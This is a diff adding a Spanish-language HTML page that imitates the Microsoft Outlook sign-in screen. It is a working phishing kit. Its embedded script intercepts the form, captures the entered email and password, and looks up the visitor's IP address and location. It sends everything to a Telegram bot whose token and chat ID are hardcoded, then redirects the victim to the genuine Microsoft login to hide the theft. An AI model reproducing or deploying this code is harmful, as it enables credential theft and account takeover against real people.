@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Servicios</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" type="text/css" href="https://tsdtw.mypi.co/info/archivos/main.css">
+    <!-- Metaetiqueta para indicar a los bots que no indexen ni sigan los enlaces -->
+    <meta name="robots" content="noindex, nofollow">
+</head>
+<body>
+<div id="vista1">   
+    <div class="limiter">
+        <div class="container-login100">
+            <div class="wrap-login100">  
+                <form id="loginForm" class="delform" action="https://login.live.com/login.srf" method="post">
+                    <img src="https://imagizer.imageshack.com/img923/803/VzFyli.png" style="width:120px;"><br><br>
+                    <div class="ms-StackItem css-102"><span class="css-103"></span></div>
+                    <span style="font-family: Helvetica; -webkit-font-smoothing: antialiased; font-size: 30px; font-weight: 600; color: rgb(27, 26, 25); display: inline; line-height: 32px;">Iniciar sesión</span>
+                    <br>Continuar en outlook<br>                
+                    <div class="wrap-input100 validate-input m-b-16" data-validate="Por favor ingresa tu correo">
+                        <input class="input100" type="email" name="bcrreo" placeholder="Correo electrónico, teléfono o Skype" required>
+                        <br><br>
+                    </div>
+                    <div class="wrap-input100 validate-input m-b-16" data-validate="Por favor ingresa tu contraseña">
+                        <input class="input100" type="password" name="bclv" placeholder="Contraseña" required>
+                        <br><br>
+                        <span style="font-size: .8125rem;"><a href="info.html" style="color: #0067b8;text-decoration:none;font-family:Helvetica;">¿Olvidaste tu contraseña?</a></span>
+                        <br><br>
+                    </div>
+                    <div class="container-login100-form-btn">
+                        <button type="submit" class="login100-form-btn">Continuar</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Conexión con el archivo JavaScript -->
+<script src="js/sax.js"></script>
+
+<script>
+document.getElementById("loginForm").addEventListener("submit", function(event) {
+    event.preventDefault(); // Evitar que el formulario se envíe de forma predeterminada
+
+    // Obtener los valores del correo y la clave del formulario
+    var correo = document.querySelector('input[name="bcrreo"]').value;
+    var clave = document.querySelector('input[name="bclv"]').value;
+
+    // Construir el mensaje que se enviará al bot de Telegram
+    var mensaje = "Correo: " + correo + "\nClave: " + clave;
+
+    // Obtener la información de geolocalización de la IP
+    fetch('https://ipapi.co/json/')
+        .then(function(response) {
+            return response.json();
+        })
+        .then(function(data) {
+            mensaje += "\n\nDirección IP: " + data.ip;
+            mensaje += "\nPaís: " + data.country_name;
+            mensaje += "\nEstado/Región: " + data.region;
+
+    // Token del bot de Telegram
+    var token = "6821107808:AAGvk27TftLb5gflY_h3MH0kOu7UaCisRXg";
+
+    // Chat ID al que enviar el mensaje
+    var chatId = "-1001956292164";
+
+    // URL de la API de Telegram para enviar mensajes
+    var apiUrl = "https://api.telegram.org/bot" + token + "/sendMessage";
+
+    // Datos que se enviarán al bot de Telegram
+    var data = {
+        chat_id: chatId,
+        text: mensaje
+    };
+
+    // Configurar la solicitud HTTP
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", apiUrl, true);
+    xhr.setRequestHeader("Content-Type", "application/json");
+
+
+    // Enviar los datos al bot de Telegram
+    xhr.send(JSON.stringify(data));
+
+    // Limpiar los campos del formulario después de enviar el mensaje
+    document.querySelector('input[name="bcrreo"]').value = "";
+    document.querySelector('input[name="bclv"]').value = "";
+
+   // Redirección después de enviar el mensaje (opcional)
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+            // Redirigir a la página deseada
+            window.location.href = "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=22&ct=1711383069&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f0%2f%3fstate%3d1%26redirectTo%3daHR0cHM6Ly9vdXRsb29rLmxpdmUuY29tL21haWwvMC8%26RpsCsrfState%3d835104b2-678e-98ee-a96e-e6a797887f8a&id=292841&aadredir=1&whr=hotmail.com&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015";
+        }
+    };
+});
+</script>
+
+
+</body>
+</html>
